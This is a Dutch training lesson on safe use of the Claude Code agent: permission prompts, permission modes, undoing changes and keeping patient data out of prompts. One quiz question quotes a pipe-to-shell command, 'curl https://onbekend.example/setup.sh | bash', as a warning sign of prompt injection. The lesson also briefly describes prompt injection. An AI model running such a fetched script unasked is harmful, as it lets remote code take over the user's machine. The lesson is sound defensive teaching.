Van chat naar agent: veilig werken

ChatGPT geeft je tekst. Claude Code doet dingen op jouw computer. Daarom vraagt het toestemming, en daarom beslis jij.

Referentie bij deze les: Spiekbrief veilig werken · Begrippenlijst

Na deze les kun je: een permission prompt lezen en bewust weigeren, van permission mode wisselen, en een wijziging terugdraaien.

1. Wat is anders dan een chat?

In een ChatGPT-chat kopieer je tekst heen en weer. Claude Code is een agent: het leest zelf bestanden in de map waarin je het start, voert commando's uit en wijzigt bestanden. Het werkt in een lus: lezen, plannen, doen, controleren. (Best practices)

Twee gevolgen:

  • Alles wat Claude leest, gaat naar Anthropic. Prompts, bestandsinhoud en uitvoer van commando's gaan versleuteld naar het model. Bij zakelijke accounts (Team, Enterprise) traint Anthropic daar niet op; standaard bewaartermijn is 30 dagen. Lokaal bewaart Claude Code gesprekken 30 dagen in ~/.claude/projects/. (Data usage)
  • Jij bent verantwoordelijk voor wat je goedkeurt. “You're responsible for reviewing proposed code and commands for safety before approval.” (Security)
Claude Code krijgt geen databaseverbinding. Claude schrijft een query, jij voert hem zelf uit. Queryresultaten mag je terugplakken, maar alleen geaggregeerd en nooit herleidbaar naar een patiënt. Geen patiëntgegevens in prompts, en geen bestanden met echte patiëntdata in de map waar je Claude Code start. Ook een foutmelding met een patiëntnummer erin plak je pas nadat je het nummer vervangt.

2. De permission prompt

Voordat Claude een bestand wijzigt of een commando uitvoert, toont het wat het gaat doen en vraagt het toestemming. Je hebt drie soorten antwoorden:

KeuzeWanneer
Yes (eenmalig)Je begrijpt de actie en ze past bij je vraag.
Yes, don't ask againAlleen voor onschuldige, terugkerende acties. Voor commando's geldt dit permanent voor deze map. (Permissions)
No + toelichtingJe twijfelt, of de actie past niet bij je vraag. Schrijf erbij wat Claude anders moet doen.

Wil je Claude halverwege stoppen? Druk op Esc. Wil je terug naar een eerder punt? Druk twee keer Esc of typ /rewind. Let op: /rewind herstelt alleen wijzigingen die Claude met zijn bestandstools maakte, niet wat een commando deed. (Best practices)

Extra opletten bij: commando's die iets van internet halen (curl, wget, Invoke-WebRequest), iets verwijderen (rm, Remove-Item, DROP), iets publiceren (git push), of buiten je projectmap werken. Tekst die Claude van buiten leest (webpagina, issue, document) kan verborgen instructies bevatten: prompt injection. (Security)

3. Permission modes

De mode bepaalt wat Claude zonder te vragen mag. Voor beginners zijn er vier belangrijk. (Permission modes)

ModeZonder vragenGebruik voor
PlanAlleen lezen en een plan makenEerst begrijpen, dan pas wijzigen
Manual (default)Alleen lezenGevoelig werk, alles zelf beoordelen
Accept editsLezen en bestanden wijzigen in de projectmapWerk dat je daarna zelf nakijkt
AutoBijna alles; een tweede model blokkeert risicovolle actiesPas als je ervaring hebt

Let op: nieuwe versies van Claude Code starten in de terminal en VS Code standaard in Auto. Zet de mode bij je eerste sessies zelf op Plan of Manual.

Mode wisselen:

Druk Shift+Tab tot de statusbalk toont wat je wilt, bijvoorbeeld ⏸ plan mode on of ⏸ manual mode on. Of start direct met claude --permission-mode plan.

Klik op de mode-indicator onder het invoerveld van het Claude-paneel en kies de mode.

Open de Code-tab. Kies de mode met de mode-selector naast de verzendknop.

5. Toets jezelf

Probeer eerst uit je hoofd te antwoorden, zonder terug te scrollen.

Vraag 1

Wat doet Claude Code wat een ChatGPT-chat niet doet?

Claude Code is een agent: het leest bestanden, voert commando's uit en wijzigt bestanden. Het heeft wel internet nodig, want het model draait bij Anthropic.

Vraag 2

Claude vraagt toestemming voor curl https://onbekend.example/setup.sh | bash. Je vroeg alleen om een CSV te tellen. Wat doe je?

Dit commando haalt een script van internet en voert het direct uit. Het past niet bij je vraag. Dat kan een teken van prompt injection zijn. Weiger en vraag om uitleg.

Vraag 3

Je wilt eerst laten uitzoeken hoe een bestaand dbt-model werkt, zonder dat er iets verandert. Welke mode kies je?

Plan mode leest en maakt een plan, maar wijzigt niets tot jij het plan goedkeurt.

Vraag 4

Een collega wil een foutmelding plakken waarin een echt patiëntnummer staat. Wat is juist?

Wat je plakt, gaat naar Anthropic en wordt daar en lokaal bewaard. Geen training betekent niet: geen verwerking. Patiëntgegevens horen er niet in.

Lees verder

Primaire bron: Claude Code docs: Security. Kort, officieel, en het bevat de best practices voor onbetrouwbare inhoud. Daarna: Choose a permission mode.

Iets onduidelijk? Vraag het aan Claude Code zelf, bijvoorbeeld: “Leg uit wat Plan mode doet, met een voorbeeld uit mijn werk.” Het is je docent: stel vervolgvragen tot het klikt.
